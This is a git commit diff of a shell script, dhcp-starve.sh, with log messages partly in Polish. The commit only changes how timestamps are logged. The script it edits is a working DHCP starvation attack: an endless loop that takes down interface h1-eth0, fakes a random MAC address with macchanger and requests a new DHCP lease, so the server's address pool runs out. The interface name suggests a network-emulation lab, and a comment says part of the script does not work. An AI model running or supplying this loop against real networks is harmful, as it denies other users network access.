60eda54eb0dc254a8f18f5e485462513cff2051f
mihaudob <mdobiecki97@gmail.com>
2021-01-19 06:22:05 -0800

    date updated

--- dhcp-starve.sh
+++ dhcp-starve.sh
@@ -3,27 +3,27 @@ COUNTER=0
 DATE=$(date)
 while true; do
    COUNTER=$[$COUNTER+1]
-   echo "${DATE}: Uruchomienie: $COUNTER"
+   echo "$(date): Uruchomienie: $COUNTER"
    # kill all running dhcp clients - just in case
 
    rm -f /var/run/dhclient.pid
-   echo "${DATE}: Usuwanie"
+   echo "$(date): Usuwanie"
    # bring down the interface
    ifconfig h1-eth0 down
-   echo "${DATE}: Interface Down"
+   echo "$(date): Interface Down"
 
    # change the MAC address of the interface and print the new MAC address
    macchanger -a h1-eth0 2>&1 | grep Faked
-   echo "${DATE}: Macchanger"
+   echo "$(date): Macchanger"
 
    # bring the interface up
    ifconfig h1-eth0 up
-   echo "${DATE}: Interface Up"
+   echo "$(date): Interface Up"
    # Nie dziala ta czesc
    # make a new DHCP lease
    dhclient h1-eth0 2>&1 | grep DHCPACK
-   echo "${DATE}: New Lease"
+   echo "$(date): New Lease"
 
    #killall dhclient
-   echo "${DATE}: Zakonczenie: $COUNTER"
+   echo "$(date): Zakonczenie: $COUNTER"
 done
